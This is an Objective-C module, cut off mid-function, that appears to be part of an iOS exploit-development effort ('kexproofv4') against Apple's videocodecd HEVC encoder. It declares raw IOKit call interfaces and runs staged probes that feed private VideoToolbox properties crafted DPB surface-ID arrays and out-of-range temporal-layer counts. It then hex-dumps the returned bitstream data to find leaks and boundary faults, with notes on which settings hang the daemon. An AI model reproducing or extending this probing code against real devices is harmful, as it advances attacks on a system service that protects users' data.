#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <unistd.h>
#import <fcntl.h>
#import <dlfcn.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 73
#endif

typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    (void)src;
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    NSString *entry = nil;
    if (st != noErr || !sb) {
        entry = [NSString stringWithFormat:@"cb st=%d info=0x%x no-sample", (int)st, (unsigned)fl];
    } else {
        CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sb, false);
        NSUInteger saKeys = 0;
        NSString *saDump = @"none";
        if (saArray && CFArrayGetCount(saArray) > 0) {
            CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
            if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
                saKeys = CFDictionaryGetCount(dict);
                NSDictionary *nsDict = (__bridge NSDictionary *)dict;
                NSMutableArray *kv = [NSMutableArray array];
                for (id k in nsDict) {
                    [kv addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
                }
                saDump = [kv componentsJoinedByString:@","];
            }
        }
        CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
        size_t totalLen = 0;
        if (block) {
            totalLen = CMBlockBufferGetDataLength(block);
        }
        entry = [NSString stringWithFormat:@"cb st=%d saKeys=%lu{%@} len=%zu",
                 (int)st, (unsigned long)saKeys, saDump, totalLen];
    }
    @synchronized (sink) {
        [sink addObject:entry];
    }
}

static void KPH9Drain(NSMutableArray *sink, int expected, int timeoutMs) {
    if (!sink || expected <= 0) return;
    int waited = 0;
    while (waited < timeoutMs) {
        int now = 0;
        @synchronized (sink) {
            now = (int)sink.count;
        }
        if (now >= expected) break;
        usleep(2000);
        waited += 2;
    }
}

static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) NS_FORMAT_FUNCTION(2, 3);
static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) {
    if (!out || !fmt) return;
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    if (!line) return;
    @synchronized (out) {
        [out appendString:line];
    }
}

// Serial bounded teardown (consumes caller's +1 create reference) and releases
// retainedRefCon / heapCtx ONLY after VTCompressionSessionInvalidate & CFRelease
// finish. Waiting up to 350 ms serializes healthy teardowns (<5 ms) so sessions
// never pile up concurrently in videocodecd, while a wedged session times out
// cleanly without deadlocking the stage thread or causing a callback UAF.
static void KPH9SafeTeardownEx(VTCompressionSessionRef s, CFTypeRef retainedRefCon, void *heapCtx) {
    if (!s) {
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        return;
    }
    static dispatch_queue_t tdQueue;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // Must be CONCURRENT: waiting on `done` below already serializes healthy
        // teardowns (<5 ms), whereas a serial queue permanently head-of-line blocks
        // all subsequent teardowns if any single session wedges in Invalidate().
        tdQueue = dispatch_queue_create("com.stealth.kexproofv4.h9.teardown", DISPATCH_QUEUE_CONCURRENT);
    });
    dispatch_semaphore_t done = dispatch_semaphore_create(0);
    dispatch_async(tdQueue, ^{
        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        dispatch_semaphore_signal(done);
    });
    dispatch_semaphore_wait(done, dispatch_time(DISPATCH_TIME_NOW, 350 * (int64_t)NSEC_PER_MSEC));
}

static void KPH9SafeTeardown(VTCompressionSessionRef s) {
    KPH9SafeTeardownEx(s, NULL, NULL);
}

// Fast 500 ms probe on a fresh session to check whether videocodecd XPC is
// genuinely unreachable before skipping subsequent stages.
static BOOL KPH9IsVideoCodecdAlive(void) {
    __block BOOL alive = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                                 kCMVideoCodecType_HEVC,
                                                 NULL, NULL, NULL, NULL, NULL, &s);
        if (st == noErr && s) {
            alive = YES;
            KPH9SafeTeardown(s);
        }
        dispatch_semaphore_signal(sem);
    });
    long w = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 500 * (int64_t)NSEC_PER_MSEC));
    return (w == 0) && alive;
}

// === Stage 6: XPC Bitstream / NAL / Attachments Leak & Exact DPB Boundary ===
// (analyst module, integrated; its bare CompleteFrames(kCMTimeInvalid) replaced
// with a bounded poll - that call deadlocks on wedged sessions)
typedef struct {
    volatile int cbCount;
    volatile int closed;
    volatile int targetIdx;
    volatile int targetHit;
    int captureSlot;
    OSStatus lastStatus;
    char summary[768];
    char first[768];  // cb#1 (IDR at pts=0)
    char second[768]; // cb#2 (P-frame at pts=1, never overwritten by cb#3..4)
    char target[768]; // pinned post-update frame callback (matched via sourceFrameRefCon)
} Stage6ProbeResult;

static CMFormatDescriptionRef gLastCapturedHEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedHEVCSampleBuffer = NULL;
static CMFormatDescriptionRef gLastCapturedAlphaHEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedAlphaHEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedSps64HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedSps64HEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedPps64HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedPps64HEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedPps127HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedPps127HEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedSps128HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedSps128HEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedSps63P63HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedSps63P63HEVCSbuf = NULL;
static CMFormatDescriptionRef gLastCapturedSps15P63HEVCFmt = NULL;
static CMSampleBufferRef gLastCapturedSps15P63HEVCSbuf = NULL;

static Stage6ProbeResult *Stage6AllocResult(void) {
    Stage6ProbeResult *res = (Stage6ProbeResult *)calloc(1, sizeof(Stage6ProbeResult));
    if (res) {
        res->targetIdx = 2;
        res->targetHit = 0;
        snprintf(res->summary, sizeof(res->summary), "(no cb)");
        snprintf(res->first, sizeof(res->first), "(no cb)");
        snprintf(res->second, sizeof(res->second), "(no cb)");
        snprintf(res->target, sizeof(res->target), "(no cb)");
    }
    return res;
}

static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
    size_t n = (len < maxBytes) ? len : maxBytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:n * 2];
    for (size_t i = 0; i < n; i++) {
        [hex appendFormat:@"%02x", buf[i]];
    }
    return hex;
}

// Walks HVCC 4-byte length-prefixed NAL units inside CMBlockBuffer to find
// the first VCL slice NALU (nal_unit_type 0..21), skipping PREFIX_SEI (39).
static NSString *ExtractHVCCVclSliceSummary(const uint8_t *buf, size_t len) {
    if (!buf || len < 6) return @"none";
    size_t off = 0;
    unsigned naluCount = 0;
    const uint8_t *vclPtr = NULL;
    size_t vclLen = 0;
    unsigned vclType = 0xff;
    while (off + 4 <= len) {
        uint32_t naluLen = ((uint32_t)buf[off] << 24) |
                           ((uint32_t)buf[off + 1] << 16) |
                           ((uint32_t)buf[off + 2] << 8) |
                           (uint32_t)buf[off + 3];
        off += 4;
        if (naluLen == 0 || off + naluLen > len) break;
        naluCount++;
        unsigned nalType = (buf[off] >> 1) & 0x3f;
        if (nalType <= 21 && !vclPtr) {
            vclPtr = buf + off;
            vclLen = naluLen;
            vclType = nalType;
        }
        off += naluLen;
    }
    if (vclPtr) {
        return [NSString stringWithFormat:@"n=%u,t=%u,l=%zu:%@",
                naluCount, vclType, vclLen, HexDumpSlice(vclPtr, vclLen, 20)];
    }
    return [NSString stringWithFormat:@"raw(%zu):%@", len, HexDumpSlice(buf, len, 20)];
}

static void Stage6OutputCallback(void *outputCallbackRefCon,
                                 void *sourceFrameRefCon,
                                 OSStatus status,
                                 VTEncodeInfoFlags infoFlags,
                                 CMSampleBufferRef sampleBuffer) {
    BOOL isTaggedTarget = (sourceFrameRefCon == (void *)(uintptr_t)0xCAFE);
    Stage6ProbeResult *res = (Stage6ProbeResult *)outputCallbackRefCon;
    if (!res || res->closed) return;
    if (status != noErr || !sampleBuffer) {
        @synchronized ([KPH9EncoderModule class]) {
            if (res->closed) return;
            res->cbCount++;
            res->lastStatus = status;
            snprintf(res->summary, sizeof(res->summary),
                     "cb#%d st=%d info=0x%x sbuf=NULL",
                     res->cbCount, (int)status, (unsigned)infoFlags);
            if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
            if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
            if (isTaggedTarget || (res->targetIdx > 0 && !res->targetHit && res->cbCount == res->targetIdx)) {
                res->targetIdx = res->cbCount;
                res->targetHit = 1;
                snprintf(res->target, sizeof(res->target), "%s", res->summary);
            }
        }
        return;
    }
    CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
    NSUInteger saKeys = 0;
    NSString *saDump = @"";
    if (saArray && CFArrayGetCount(saArray) > 0) {
        CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
        if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
            saKeys = CFDictionaryGetCount(dict);
            NSDictionary *nsDict = (__bridge NSDictionary *)dict;
            NSMutableArray *kvParts = [NSMutableArray array];
            for (id k in nsDict) {
                [kvParts addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
            }
            saDump = [kvParts componentsJoinedByString:@","];
        }
    }
    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
    size_t paramCount = 0;
    NSString *vpsHex = @"none";
    NSString *spsHex = @"none";
    NSString *ppsHex = @"none";
    size_t vpsSize = 0, spsSize = 0, ppsSize = 0;
    if (fmt) {
        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &paramCount, NULL);
        const uint8_t *vpsPtr = NULL, *spsPtr = NULL, *ppsPtr = NULL;
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, &vpsPtr, &vpsSize, NULL, NULL) == noErr && vpsPtr) {
            size_t vpsMax = (vpsSize > 26) ? 44 : 16;
            vpsHex = [NSString stringWithFormat:@"%zu:%@", vpsSize, HexDumpSlice(vpsPtr, vpsSize, vpsMax)];
        }
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 1, &spsPtr, &spsSize, NULL, NULL) == noErr && spsPtr) {
            size_t spsMax = (spsSize > 36) ? 44 : 36;
            spsHex = [NSString stringWithFormat:@"%zu:%@", spsSize, HexDumpSlice(spsPtr, spsSize, spsMax)];
        }
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 2, &ppsPtr, &ppsSize, NULL, NULL) == noErr && ppsPtr) {
            ppsHex = [NSString stringWithFormat:@"%zu:%@", ppsSize, HexDumpSlice(ppsPtr, ppsSize, 24)];
            if (paramCount > 3) {
                NSMutableArray *extraPps = [NSMutableArray array];
                for (size_t pi = 3; pi < paramCount && pi < 12; pi++) {
                    const uint8_t *pExtra = NULL;
                    size_t pExtraSz = 0;
                    if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, pi, &pExtra, &pExtraSz, NULL, NULL) == noErr && pExtra) {
                        [extraPps addObject:[NSString stringWithFormat:@"ps%zu=%zu:%@", pi, pExtraSz, HexDumpSlice(pExtra, pExtraSz, 16)]];
                    }
                }
                if (extraPps.count > 0) {
                    ppsHex = [NSString stringWithFormat:@"%@(%@)", ppsHex, [extraPps componentsJoinedByString:@","]];
                }
            }
        }
    }
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sampleBuffer);
    NSString *vclSummary = @"none";
    size_t totalLen = 0;
    if (block) {
        char *dataPtr = NULL;
        size_t lengthAtOffset = 0;
        if (CMBlockBufferGetDataPointer(block, 0, &lengthAtOffset, &totalLen, &dataPtr) == noErr && dataPtr) {
            vclSummary = ExtractHVCCVclSliceSummary((const uint8_t *)dataPtr, lengthAtOffset);
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        if (fmt && !gLastCapturedHEVCFmt) {
            gLastCapturedHEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
        }
        if (sampleBuffer && !gLastCapturedHEVCSampleBuffer) {
            gLastCapturedHEVCSampleBuffer = (CMSampleBufferRef)CFRetain(sampleBuffer);
        }
        if (res->captureSlot == 1 || (res->captureSlot == 0 && vpsSize >= 38 && spsSize == 29 && ppsSize <= 9)) {
            if (fmt && !gLastCapturedAlphaHEVCFmt) gLastCapturedAlphaHEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedAlphaHEVCSbuf) gLastCapturedAlphaHEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 2 || (res->captureSlot == 0 && vpsSize >= 38 && spsSize == 30)) {
            if (fmt && !gLastCapturedSps64HEVCFmt) gLastCapturedSps64HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedSps64HEVCSbuf) gLastCapturedSps64HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 3) {
            if (fmt && !gLastCapturedPps64HEVCFmt) gLastCapturedPps64HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedPps64HEVCSbuf) gLastCapturedPps64HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 4 || (res->captureSlot == 0 && vpsSize >= 38 && spsSize == 29 && ppsSize >= 10)) {
            if (fmt && !gLastCapturedPps127HEVCFmt) gLastCapturedPps127HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedPps127HEVCSbuf) gLastCapturedPps127HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 5 || (res->captureSlot == 0 && spsSize >= 36)) {
            if (fmt && !gLastCapturedSps128HEVCFmt) gLastCapturedSps128HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedSps128HEVCSbuf) gLastCapturedSps128HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 6) {
            if (fmt && !gLastCapturedSps63P63HEVCFmt) gLastCapturedSps63P63HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedSps63P63HEVCSbuf) gLastCapturedSps63P63HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        } else if (res->captureSlot == 7) {
            if (fmt && !gLastCapturedSps15P63HEVCFmt) gLastCapturedSps15P63HEVCFmt = (CMFormatDescriptionRef)CFRetain(fmt);
            if (sampleBuffer && !gLastCapturedSps15P63HEVCSbuf) gLastCapturedSps15P63HEVCSbuf = (CMSampleBufferRef)CFRetain(sampleBuffer);
        }
        if (res->closed) return;
        res->cbCount++;
        res->lastStatus = status;
        snprintf(res->summary, sizeof(res->summary),
                 "cb#%d st=%d info=0x%x saKeys=%lu{%s} ps=%zu vps=%s sps=%s pps=%s vcl(%zu)=%s",
                 res->cbCount, (int)status, (unsigned)infoFlags,
                 (unsigned long)saKeys, [saDump UTF8String], paramCount,
                 [vpsHex UTF8String], [spsHex UTF8String], [ppsHex UTF8String],
                 totalLen, [vclSummary UTF8String]);
        if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
        if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
        if (isTaggedTarget || (res->targetIdx > 0 && !res->targetHit && res->cbCount == res->targetIdx)) {
            res->targetIdx = res->cbCount;
            res->targetHit = 1;
            snprintf(res->target, sizeof(res->target), "%s", res->summary);
        }
    }
}

static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
    CVPixelBufferRef px = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        (__bridge CFDictionaryRef)attrs, &px);
    return px;
}

static void KPH9PrimeRealTime(VTCompressionSessionRef session) {
    if (!session) return;
    // NOTE: Never set kVTCompressionPropertyKey_AllowFrameReordering = kCFBooleanFalse
    // on an EnableUserRefForFacetime session — that combination wedges H9's session
    // pipeline in videocodecd on encode[1] and hangs VTCompressionSessionInvalidate.
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
}

// --- Analyst (in tree): real IOSurfaceID plumbing for UserDPBFramesForFaceTime ---
// SetDPBSnapShot resolves each DPB entry through IOSurfaceLookup, so only live
// IOSurfaceIDs (or 0 = empty slot) survive PrepareToEncodeFrames. The pool buffers
// MUST stay retained while any session referencing their IDs is alive — freed
// surfaces make the IDs invalid and the lookup fails.
static NSString *Stage7ReadbackDPB(VTCompressionSessionRef session);

static uint32_t KPH9GetPixelBufferSurfaceID(CVPixelBufferRef pb) {
    if (!pb) return 0;
    IOSurfaceRef surf = CVPixelBufferGetIOSurface(pb);
    if (!surf) return 0;
    return (uint32_t)IOSurfaceGetID(surf);
}

static NSArray<NSNumber *> *KPH9AllocSurfacePool(size_t count,
                                                 int width,
                                                 int height,
                                                 NSMutableArray *retainedBuffersOut) {
    NSMutableArray<NSNumber *> *ids = [NSMutableArray arrayWithCapacity:count];
    for (size_t i = 0; i < count; i++) {
        CVPixelBufferRef pb = CreateDummyNV12Buffer(width, height);
        if (pb) {
            CVPixelBufferLockBaseAddress(pb, 0);
            memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), (int)((0x20 + (i * 7)) & 0x7f),
                   CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
            memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
                   CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
            CVPixelBufferUnlockBaseAddress(pb, 0);
            [ids addObject:@(KPH9GetPixelBufferSurfaceID(pb))];
            if (retainedBuffersOut) {
                [retainedBuffersOut addObject:(__bridge id)pb];
            }
            CFRelease(pb);
        } else {
            [ids addObject:@0];
        }
    }
    return ids;
}

static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 6: DPB Exact Boundary (1..15, 34..48) & Bitstream/NAL Audit ---\n");
    // Analyst: SetDPBSnapShot accepts only surfaces ALREADY encoded in this session
    // (internal DPB table), so warm 5 pool buffers through EncodeFrame first.
    int probeCounts[] = { 1, 2, 4, 8, 16, 30, 32, 33, 34, 35, 36, 48 };
    size_t numProbes = sizeof(probeCounts) / sizeof(probeCounts[0]);
    NSMutableArray *surfaceHolders = [NSMutableArray array];
    NSArray<NSNumber *> *poolIDs = KPH9AllocSurfacePool(18, 192, 144, surfaceHolders);
    KPH9OutAppend(log, @"  [surf pool] n=%lu ids[0..3]=%u,%u,%u,%u\n",
                  (unsigned long)poolIDs.count,
                  poolIDs.count > 0 ? poolIDs[0].unsignedIntValue : 0,
                  poolIDs.count > 1 ? poolIDs[1].unsignedIntValue : 0,
                  poolIDs.count > 2 ? poolIDs[2].unsignedIntValue : 0,
                  poolIDs.count > 3 ? poolIDs[3].unsignedIntValue : 0);
    for (size_t i = 0; i < numProbes; i++) {
        int count = probeCounts[i];
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        res->targetIdx = -1;
        VTCompressionSessionRef session = NULL;
        // Без EncoderUsage=1 — вместе с EnableUserRefForFacetime он даёт -17691.
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 192, 144,
            kCMVideoCodecType_HEVC, (__bridge CFDictionaryRef)spec, NULL, NULL,
            Stage6OutputCallback, res, &session);
        if (st != noErr || !session) {
            KPH9OutAppend(log, @"  dpb[x%-2d] create=%d\n", count, (int)st);
            free(res);
            continue;
        }
        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        KPH9PrimeRealTime(session);
        OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        // Прогреваем сессию реальными буферами из surfaceHolders (5 кадров = IDR + 4 P/B),
        // чтобы их IOSurfaceID попали во внутренний DPB перед SetDPBSnapShot
        int64_t nextPts = 0;
        for (int warm = 0; warm < 5; warm++) {
            CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)surfaceHolders[(NSUInteger)warm % surfaceHolders.count];
            VTCompressionSessionEncodeFrame(session, wpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
        }
        int ww = 0;
        while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }
        NSMutableArray *dpbArr = [NSMutableArray arrayWithCapacity:(NSUInteger)count];
        for (int k = 0; k < count; k++) {
            if ((k % 2) == 0) {
                NSUInteger pairIdx = (NSUInteger)(k / 2) % 5;
                [dpbArr addObject:poolIDs[pairIdx]];
            } else {
                [dpbArr addObject:@0];
            }
        }
        OSStatus setSt = VTSessionSetProperty(
            session,
            CFSTR("UserDPBFramesForFaceTime"),
            (__bridge CFTypeRef)dpbArr);
        NSString *rbStr = Stage7ReadbackDPB(session);
        res->targetHit = 0;
        res->targetIdx = -1;
        CVPixelBufferRef pxTarget = (__bridge CVPixelBufferRef)surfaceHolders[0];
        NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": dpbArr };
        VTCompressionSessionEncodeFrame(session, pxTarget, CMTimeMake(nextPts++, 30), kCMTimeInvalid,
                                        (__bridge CFDictionaryRef)fp, (void *)(uintptr_t)0xCAFE, NULL);
        for (int flush = 0; flush < 4 && !res->targetHit; flush++) {
            CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)surfaceHolders[(NSUInteger)(flush + 1) % 5];
            VTCompressionSessionEncodeFrame(session, fpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int sw = 0;
            while (!res->targetHit && sw < 40) { usleep(2000); sw += 2; }
        }
        @synchronized ([KPH9EncoderModule class]) {
            res->closed = 1;
            const char *postCb = res->targetHit ? res->target : res->second;
            KPH9OutAppend(log, @"  dpb[surf x%-2d (%d pairs)] set=%-6d prep=%-6d rb=%@ cbs=%d | cb1: %s | cbPost: %s\n",
                          count, count / 2, (int)setSt, (int)prepSt, rbStr,
                          res->cbCount, res->first, postCb);
        }
        KPH9SafeTeardownEx(session, NULL, res);
    }
    KPH9OutAppend(log, @"  [6B: Dyadic Clamp Ratio Steering (ExpectedFrameRate / BaseLayerFrameRate, BaseFPS=15 >= 1.0)]\n");
    int dyadicRatios[] = { 1, 2, 4, 8, 16, 32, 64, 128, 256 };
    CVPixelBufferRef px6B = CreateDummyNV12Buffer(192, 144);
    for (size_t i = 0; i < sizeof(dyadicRatios) / sizeof(dyadicRatios[0]); i++) {
        int ratio = dyadicRatios[i];
        int expFps = 15 * ratio;
        int baseFps = 15;
        CFNumberRef nExp = CFNumberCreate(NULL, kCFNumberIntType, &expFps);
        CFNumberRef nBase = CFNumberCreate(NULL, kCFNumberIntType, &baseFps);

        // 1) EncoderUsage=1 dyadic clamp readback (must set EncoderUsage=1 via VTSessionSetProperty before NTL=16447)
        int u1PostNtl = -1;
        OSStatus u1PrepSt = -999;
        {
            VTCompressionSessionRef us = NULL;
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                           kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                                           NULL, NULL, &us) == noErr && us) {
                VTSessionSetProperty(us, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(us, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                KPH9PrimeRealTime(us);
                VTSessionSetProperty(us, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
                VTSessionSetProperty(us, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
                VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
                u1PrepSt = VTCompressionSessionPrepareToEncodeFrames(us);
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &u1PostNtl);
                    CFRelease(rb);
                }
                KPH9SafeTeardown(us);
            }
        }

        // 2) Clean non-realtime session (Usage=0) with effNtl=min(1+log2(ratio), 7) so EncodeFrame[0] succeeds (st=0)
        //    and dumps the true 1..7 sub-layer VPS/SPS across the full dyadic ladder (15/15 -> 3840/15).
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) {
            CFRelease(nExp);
            CFRelease(nBase);
            continue;
        }
        VTCompressionSessionRef session = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                       kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                                       Stage6OutputCallback, res, &session) == noErr && session) {
            int reqNtl = ((int)i + 1 <= 7) ? ((int)i + 1) : 7;
            VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
            OSStatus setNtlSt = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(reqNtl));
            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
            CFNumberRef postNtlRef = NULL;
            int postNtl = -1;
            if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &postNtlRef) == noErr && postNtlRef) {
                CFNumberGetValue(postNtlRef, kCFNumberIntType, &postNtl);
                CFRelease(postNtlRef);
            }
            if (px6B) {
                VTCompressionSessionEncodeFrame(session, px6B, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                if (strstr(res->first, "sbuf=NULL") != NULL) {
                    VTCompressionSessionRef fbS = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                   NULL, NULL, NULL, Stage6OutputCallback, res, &fbS) == noErr && fbS) {
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(reqNtl == 1 ? 15 : 960));
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
                        VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(reqNtl));
                        VTCompressionSessionPrepareToEncodeFrames(fbS);
                        VTCompressionSessionEncodeFrame(fbS, px6B, CMTimeMake(1, 30), kCMTimeInvalid,
                                                        NULL, (void *)(uintptr_t)0xCAFE, NULL);
                        int w1 = 0;
                        while (!res->targetHit && w1 < 80) { usleep(2000); w1 += 2; }
                        VTSessionSetProperty(fbS, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
